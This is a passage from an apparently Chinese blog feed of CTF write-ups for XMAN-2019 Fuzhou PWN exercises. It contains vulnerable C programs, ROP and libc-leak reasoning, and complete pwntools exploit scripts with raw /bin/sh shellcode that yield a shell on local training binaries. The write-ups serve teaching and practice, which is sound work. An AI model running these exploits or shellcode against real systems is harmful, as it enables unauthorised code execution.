class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">overflow</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+18h] [ebp-20h]</span></span><br><span class="line"></span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x3FF</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>检查一下开启的保护措施</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>可以得知存在非常明显的栈溢出漏洞，但是这一次没有全局可写的buf地址，我们先看看我们有什么可以利用的点，可以进行ROP</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/git/XMAN-2019-FZU/日程科目题目/PWN/simple_stackoverflow2$ objdump -R simple_stackoverflow2</span><br><span class="line"></span><br><span class="line">simple_stackoverflow2:     file format elf32-i386</span><br><span class="line"></span><br><span class="line">DYNAMIC RELOCATION RECORDS</span><br><span class="line">OFFSET   TYPE              VALUE </span><br><span class="line">08049ffc R_386_GLOB_DAT    __gmon_start__</span><br><span class="line">0804a040 R_386_COPY        stderr@@GLIBC_2.0</span><br><span class="line">0804a044 R_386_COPY        stdin@@GLIBC_2.0</span><br><span class="line">0804a060 R_386_COPY        stdout@@GLIBC_2.0</span><br><span class="line">0804a00c R_386_JUMP_SLOT   setbuf@GLIBC_2.0</span><br><span class="line">0804a010 R_386_JUMP_SLOT   read@GLIBC_2.0</span><br><span class="line">0804a014 R_386_JUMP_SLOT   __gmon_start__</span><br><span class="line">0804a018 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0</span><br></pre></td></tr></table></figure><p>可以发现有一个read函数可以利用并且程序也没有开启地址随机化，这样我们只需要在溢出时跳转到read函数的地址调用read函数在buf读入shellcode，然后控制read函数的返回地址为buf继续执行shellcode就完成了</p><p>首先read函数<code>ssize_t read [1]  (int fd, void *buf, size_t count);</code></p><p>我们需要将第一个参数置为1，第二个参数为要写入的buf地址，第三个为buf的大小</p><p>于是就有<code>p32(0)+p32(buf2_addr)+p32(0x100)</code></p><p>然后因为还需要控制read函数的返回地址到buf处</p><p>于是就有<code>36 *&quot;a&quot; + p32(e.symbols[&quot;read&quot;]) + p32(buf2_addr)</code></p><p>最终的Exploit</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">'./simple_stackoverflow2'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">e = ELF(<span class="string">'./simple_stackoverflow2'</span>)</span><br><span class="line">buf2_addr = <span class="number">0x0804a100</span></span><br><span class="line">payload1 = <span class="number">36</span> *<span class="string">"a"</span> + p32(e.symbols[<span class="string">"read"</span>]) + p32(buf2_addr)</span><br><span class="line">payload1 += p32(<span class="number">0</span>)+p32(buf2_addr)+p32(<span class="number">0x100</span>)</span><br><span class="line">sh.sendline(payload1)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">sh.sendline(shellcode)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="simple-stackoverflow2-nx"><a href="#simple-stackoverflow2-nx" class="headerlink" title="simple_stackoverflow2_nx"></a>simple_stackoverflow2_nx</h2><p>先看看源代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">overflow</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> overflow[<span class="number">24</span>];</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">1023</span>);</span><br><span class="line">    read(<span class="number">0</span>, overflow, <span class="number">1023</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">    overflow();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后看看IDA反汇编出来的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> overflow();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">overflow</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+18h] [ebp-20h]</span></span><br><span class="line"></span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x3FF</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>检查一下开启的保护措施</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>可以看到和上一题最大的不同点就是开启了NX防护，这样子的话我们的栈就变为了不可执行，通过检查也的确是这样的</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">gdb-peda$</span> vmmap</span><br><span class="line">Warning: not running</span><br><span class="line">Start      End        PermName</span><br><span class="line">0x0804835c 0x080485e8 rx-p/home/syc/git/XMAN-2019-FZU/日程科目题目/PWN/simple_stackoverflow2_nx/simple_stackoverflow2_nx</span><br><span class="line">0x08048154 0x08048714 r--p/home/syc/git/XMAN-2019-FZU/日程科目题目/PWN/simple_stackoverflow2_nx/simple_stackoverflow2_nx</span><br><span class="line">0x08049f08 0x0804a06c rw-p/home/syc/git/XMAN-2019-FZU/日程科目题目/PWN/simple_stackoverflow2_nx/simple_stackoverflow2_nx</span><br></pre></td></tr></table></figure><p>但是我们依然有办法执行系统调用<code>system(&quot;/bin/sh&quot;)</code></p><p>利用 ropgadget，我们可以查看是否有 <code>/bin/sh</code> 存在</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/git/XMAN-2019-FZU/日程科目题目/PWN/simple_stackoverflow2_nx$ ROPgadget --binary simple_stackoverflow2_nx --string '/bin/sh' </span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br></pre></td></tr></table></figure><p>可以知道不存在<code>/bin/sh</code></p><p>查找一下是否有<code>system</code> 函数存在。经在 ida 中查找，不存在。</p><p>那么我们如何得到 system 函数的地址呢？这里就主要利用了两个知识点</p><ul><li>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</li><li>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。而 libc 在 github 上有人进行收集，如下 </li><li><a href="https://github.com/niklasb/libc-database" target="_blank" rel="noopener">https://github.com/niklasb/libc-database</a></li></ul><p>所以如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system 函数的地址。</p><p>那么如何得到 libc 中的某个函数的地址呢？我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。<strong>当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。</strong></p><p>我们自然可以根据上面的步骤先得到 libc，之后在程序中查询偏移，然后再次获取 system 地址，但这样手工操作次数太多，有点麻烦，这里给出一个 libc 的利用工具，具体细节请参考 readme</p><ul><li><a href="https://github.com/lieanu/LibcSearcher" target="_blank" rel="noopener">https://github.com/lieanu/LibcSearcher</a></li></ul><p>此外，在得到 libc 之后，其实 libc 中也是有 /bin/sh 字符串的，所以我们可以一起获得 /bin/sh 字符串的地址。</p><p>这里我们泄露 __libc_start_main 的地址，这是因为它是程序最初被执行的地方。基本利用思路如下</p><ul><li>泄露 __libc_start_main 地址</li><li>获取 libc 版本</li><li>获取 system 地址与 /bin/sh 的地址</li><li>再次执行源程序</li><li>触发栈溢出执行 system(‘/bin/sh’)</li></ul><p>我们一般通过<code>write</code>函数来泄漏libc的相关地址信息</p><p>write函数原型是write(fd, addr, len)，即将addr作为起始地址，读取len字节的数据到文件流fd（0表示标准输入流stdin、1表示标准输出流stdout）。write函数的优点是可以读取任意长度的内存信息，即它的打印长度只受len参数控制，缺点是需要传递3个参数。且需注意地址置为要调用的函数地址，注意是got地址而不是plt地址。</p><p>则我们的payload1可以写为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">"A"</span>*<span class="number">0x24</span>+p32(elf.symbols[<span class="string">"write"</span>])+p32(overflow) + p32(<span class="number">1</span>)+p32(elf.got[<span class="string">"write"</span>])+p32(<span class="number">12</span>)</span><br></pre></td></tr></table></figure><p>因为我们要重复利用<code>overflow</code>函数，故返回地址需要设置为<code>overflow</code>的起始地址</p><p>但因为程序本身并没有调用<code>system()</code>函数，所以我们并不能直接调用<code>system()</code>来获取shell。但其实我们有<code>write()</code>函数就够了，因为我们可以通过<code>write()</code>函数把中的<code>write()</code>函数在内存中的地址也就是write.got给打印出来。既然write()函数实现是在libc.so当中，那我们调用的<code>write()</code>函数为什么也能实现<code>write()</code>功能呢? 这是因为linux采用了延时绑定技术，当我们调用<code>write()</code>的时候，系统会将真正的<code>write()</code>函数地址link到got表的<code>write.got</code>中，然后<code>write()</code>会根据<code>write.got</code>跳转到真正的<code>write()</code>函数上去。</p><p>因为<code>system()</code>函数和<code>write()</code>在<code>libc.so</code>中的<code>offset(相对地址)</code>是不变的，所以如果我们得到了<code>write()</code>的地址并且拥有目标服务器上的<code>libc.so</code>就可以根据已知的<code>write()</code>的地址和偏移量计算出<code>system()</code>在内存中的地址了。</p><p>偏移量也可以使用<code>pwntools</code>来进行计算</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">off_set = libc.symbols[<span class="string">'write'</span>] - libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br></pre></td></tr></table></figure><p>所以libc的基地址也可以计算</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libc_address = write_address - off_set</span><br></pre></td></tr></table></figure><p>则我们的payload2可以写为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">"A"</span>*<span class="number">0x24</span>+p32(libc.symbols[<span class="string">"system"</span>])+p32(<span class="number">0xcafebabe</span>)+p32(libc.search(<span class="string">"/bin/sh\x00"</span>).next())</span><br></pre></td></tr></table></figure><p>最终的Exploit为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">p = process(<span class="string">"./simple_stackoverflow2_nx"</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">leave_ret = <span class="number">0x80484FC</span><span class="comment">#overflow leave ret</span></span><br><span class="line">overflow = <span class="number">0x080484DB</span></span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">0x24</span>+p32(elf.symbols[<span class="string">"write"</span>])+p32(overflow)</span><br><span class="line">payload += p32(<span class="number">1</span>)+p32(elf.got[<span class="string">"write"</span>])+p32(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">libc.address = u32(p.recv(<span class="number">4</span>))<span class="number">-0xd5b70</span></span><br><span class="line">info(<span class="string">"libc : "</span> + hex(libc.address))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">0x24</span>+p32(libc.symbols[<span class="string">"system"</span>])+p32(<span class="number">0xcafebabe</span>)+p32(libc.search(<span class="string">"/bin/sh\x00"</span>).next())</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">elf = ELF(<span class="string">"./simple_stackoverflow2_nx"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc.so"</span>)</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>这题的Exploit还有一种写法，我还不是很能理解，到时候我再填坑吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'i386'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./simple_stackoverflow2'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.i386.linux.sh())</span><br><span class="line"></span><br><span class="line">ret_addr = <span class="number">0x0804A060</span> </span><br><span class="line">bss = <span class="number">0x0804A200</span></span><br><span class="line">write_plt = <span class="number">0x080483C0</span></span><br><span class="line">read_plt = <span class="number">0x080483A0</span></span><br><span class="line">read_got = <span class="number">0x0804A010</span></span><br><span class="line">setbuf_plt = elf.plt[<span class="string">'setbuf'</span>]</span><br><span class="line">setbuf_got = elf.got[<span class="string">'setbuf'</span>]</span><br><span class="line">pppr = <span class="number">0x080485c9</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attach</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(io, <span class="string">"b *0x80484FD \nc"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = process(elf.path)  <span class="comment"># , env=&#123;'LD_PRELOAD': 'libc.so.6'&#125;)</span></span><br><span class="line"><span class="comment"># io = remote('localhost', 2333)</span></span><br><span class="line">attach()</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p32(write_plt)</span><br><span class="line">payload += p32(pppr)</span><br><span class="line">payload += p32(<span class="number">1</span>)</span><br><span class="line">payload += p32(setbuf_got)</span><br><span class="line">payload += p32(<span class="number">0x4</span>)</span><br><span class="line"></span><br><span class="line">payload += p32(read_plt)</span><br><span class="line">payload += p32(pppr)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(setbuf_got)</span><br><span class="line">payload += p32(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">payload += p32(setbuf_plt)</span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p32(setbuf_got+<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># io.sendline('a'*36 + p32(ret_addr) + 'a' *32 + shellcode)</span></span><br><span class="line">io.send(<span class="string">'a'</span>*<span class="number">36</span> + payload)</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">setbuf_addr = u32(io.read(<span class="number">4</span>))</span><br><span class="line">log.info(<span class="string">"setbuf_addr:%08x"</span> % setbuf_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">setbuf_offset = <span class="number">0x0065ff0</span></span><br><span class="line">libc.address = setbuf_addr - setbuf_offset</span><br><span class="line">log.info(<span class="string">"libc:%08x"</span> % libc.address)</span><br><span class="line"></span><br><span class="line">payload2 = p32(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">payload2 += <span class="string">"/bin/sh\x00"</span></span><br><span class="line"></span><br><span class="line">io.send(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>XMAN-2019-福州-PWN-ShellCode</title>
      <link href="/2019/08/06/XMAN-2019-%E2%95%95%C3%BA%E2%95%93%E2%96%8C-PWN-ShellCode/"/>
      <url>/2019/08/06/XMAN-2019-%E2%95%95%C3%BA%E2%95%93%E2%96%8C-PWN-ShellCode/</url>
      
        <content type="html"><![CDATA[<p>在本次XMAN-2019福州站的夏令营的Pwn专题中，关于ShellCode的题目主要有两题：shellcode和shellcode2，都是很基础的题目。我最喜欢的环节是哪个关于ShellCode如何绕过的互动环节，听到了很多种不同的思路，虽然自己也做出来了，但是没发现大家还有还有这么多不同的思路，感觉自己的思维得到了非常大的拓展。本来PWN题的解法就有很多，十分渴望可以听到各种不同的思路。</p><p>相关资料均可在GitHub上下载：<a href="https://github.com/suyucheng-lz/XMAN-2019-FZU" target="_blank" rel="noopener">https://github.com/suyucheng-lz/XMAN-2019-FZU</a></p><h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><p>首先放源代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> shellcode[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">    read(<span class="number">0</span>, shellcode, <span class="number">1023</span>);</span><br><span class="line">    (*(<span class="keyword">void</span> (*)()) shellcode)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过IDA Pro反汇编出来的代码为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;shellcode, <span class="number">0x3FF</span>u);</span><br><span class="line">  <span class="keyword">return</span> ((<span class="keyword">int</span> (*)(<span class="keyword">void</span>))shellcode)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>检查一下防护措施</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span></span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>可以看到有很明显的攻击漏洞，程序会直接读取我们输入的东西并执行，我们只需要构造ShellCode并传入即可</p><p>构造的shellcode应该是这样的,执行的即为<code>system（&quot;/bin/sh\x00&quot;)</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">xor eax, eax</span><br><span class="line">push eax</span><br><span class="line">push <span class="number">0x68732f2f</span></span><br><span class="line">push <span class="number">0x6e69622f</span></span><br><span class="line">mov ebx, esp</span><br><span class="line">push eax</span><br><span class="line">push ebx</span><br><span class="line">mov ecx, esp</span><br><span class="line">cltd</span><br><span class="line">move al, <span class="number">0xb</span></span><br><span class="line"><span class="keyword">int</span> <span class="number">0x80</span></span><br></pre></td></tr></table></figure><p>Exploit如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!python</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./shellcode"</span>)</span><br><span class="line"><span class="comment">#p = remote("120.79.114.39",10001)</span></span><br><span class="line">shellcode = <span class="string">"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"</span></span><br><span class="line">shellcode += <span class="string">"\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"</span></span><br><span class="line">shellcode += <span class="string">"\x0b\xcd\x80"</span></span><br><span class="line">payload = shellcode</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="shellcode2"><a href="#shellcode2" class="headerlink" title="shellcode2"></a>shellcode2</h2><p>首先通过IDA Pro反汇编出来的代码为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  read(<span class="number">0</span>, shellcode, <span class="number">0x3FF</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(shellcode, <span class="string">"sh"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"shellcode detected!"</span>);</span><br><span class="line">    result = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    (*(<span class="keyword">void</span> (**)(<span class="keyword">void</span>))shellcode)();</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span 